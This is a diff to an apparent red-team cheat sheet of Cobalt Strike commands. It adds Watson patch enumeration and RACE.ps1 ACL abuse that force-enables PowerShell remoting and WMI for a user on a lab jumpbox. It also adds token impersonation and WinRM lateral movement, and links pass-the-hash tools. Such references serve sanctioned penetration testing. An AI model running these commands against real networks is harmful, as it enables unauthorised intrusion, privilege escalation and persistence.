@@ -69,6 +69,14 @@ execute-assembly C:\SeatBelt.exe -group=remote -outputfile="C:\Temp\SeatBelt-rem
 execute-assembly C:\SeatBelt.exe -group=misc -outputfile="C:\Temp\SeatBelt-misc.json"
 ```
 
+### Watson - .NET version of Sherlock.ps1 to look for missing KBs on Windows
+```
+# Peroform all checks and output to console
+# Supports:
+    Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004
+    Server 2016 & 2019
+execute-assembly C:\Watson.exe 
+```
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
 Enable Powershell Remoting manually
@@ -85,12 +93,17 @@ powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; host
 ```
 
 [RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
+Stealthier than above method since it doesn't touch disk
 ```
 powershell-import --> RACE.ps1
-make_token AD\Admin password --> This tool will require Admin privileges on the remote system  
+make_token AD\Admin password --> This tool requires Admin privileges on the remote system being targeted
 
-powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com --> Force enable PS remoting for the specific user
-powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com --> Force enable WMI for the specific user
+powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-jumpbox.lab.com --> Force enable PS remoting for the specific user
+powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.com --> Force enable WMI for the specific user
+
+# Move laterally in CS with WinRM for the specified user
+make_token AD\testuser password
+jump [winrm/winrm64] ops-jumpbox.lab.com LISTENER
 ```
 
 [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
